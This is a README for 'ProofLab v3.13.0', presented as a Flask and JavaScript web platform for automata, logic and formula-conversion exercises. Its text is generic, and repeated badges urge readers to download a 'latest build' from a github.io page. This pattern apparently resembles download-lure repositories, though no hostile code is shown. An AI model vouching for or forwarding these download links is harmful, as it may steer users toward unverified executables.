# ProofLab v3.13.0 - TFCS educational web platform 2026

> **ProofLab is a browser-based TFCS learning environment for working through automata, logic, and formula conversions with interactive simulations, step-by-step traces, and AI-assisted explanations in version 3.13.0.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.13.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henry-miller64/prooflab-v3130-tfcs-platform?style=flat-square)](https://github.com/henry-miller64/prooflab-v3130-tfcs-platform)

---

<p align="center">
  <a href="https://henry-miller64.github.io/prooflab-v3130-tfcs-platform/">
    <img src="https://img.shields.io/badge/Download-ProofLab%20Latest-brightgreen?style=for-the-badge" alt="Download ProofLab">
  </a>
</p>

> **[Direct Download - ProofLab v3.13.0](https://henry-miller64.github.io/prooflab-v3130-tfcs-platform/)**

---

[Download Latest Build](https://henry-miller64.github.io/prooflab-v3130-tfcs-platform/)

---

## Overview

ProofLab collects the main ideas from theoretical foundations of computer science into one web app. It is aimed at students, teachers, and independent learners who want to see how automata run, how logical formulas change form, and how resolution steps progress from one stage to the next.

The app pairs a Python and Flask backend with a JavaScript-based front end so computations can be presented clearly in the browser. In addition to working directly with simulations and transformations, users can lean on AI-generated explanations to make the reasoning behind each output easier to follow.

---

## Capabilities

- DFA and NFA simulation for automata-based exercises
- Propositional resolution with CNF conversion support
- NNF, CNF, and DNF formula transformation tools
- Truth table generation for propositional logic study
- Step-by-step computation traces for transparent walkthroughs
- Interactive web UI for hands-on classroom or solo use
- AI-powered explanations to help interpret results and procedures
- Full-stack architecture using Flask, Python, and Vanilla JavaScript

---

## Installation

Clone the repository or download the project files locally:

- `git clone https://github.com/henry-miller64/prooflab-v3130-tfcs-platform.git
- or download the latest build from the project page above

Once the files are in your workspace, start the app using the backend entry point provided by the repository, then load the web interface in your browser. If you are running from source, prepare the Python environment and any required dependencies before starting.

---

## How to Use

A common workflow looks like this:

1. Open ProofLab in a browser.
2. Select the tool that fits your topic, such as automata simulation or logic transformation.
3. Enter the automaton, formula, or statement you want to analyze.
4. Inspect the generated trace, converted form, or truth table.
5. Use the explanation panel for a guided breakdown of the result.

ProofLab is handy for reviewing homework, walking through lecture examples, and comparing hand-worked solutions against computed answers. Its step-by-step display is particularly useful when learning how each phase contributes to the final result.

---

## Configuration

Most behavior is expected to be controlled through the application code and the web UI. If the repository includes local settings, keep them in the backend configuration area and set any environment values before launching.

Example environment setup pattern:

    FLASK_ENV=development
    APP_PORT=5000

If the project provides separate front-end or explanation settings, check the repository files for the appropriate configuration location before running the app.

---

## Requirements

- Web browser for accessing the interface
- Python runtime for the Flask backend
- JavaScript-enabled browser for full interaction
- Local storage or workspace space for the cloned project
- Network access if AI explanation features depend on external services

---

## FAQ

**How do I get updates?**  
Download the current build from the latest release or the project page link.

**Where are settings stored?**  
Look in the backend and repository files for environment variables or app configuration modules.

**What if the app does not start?**  
Check the Python environment, dependencies, and launch command, then make sure the correct project folder is being used.

**Can I use it for classwork?**  
Yes, the platform is designed around TFCS study workflows such as automata simulation, logic resolution, and formula conversion.

**Does it provide explanations?**  
Yes, AI-assisted explanations are included to help clarify the steps shown by the tools.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
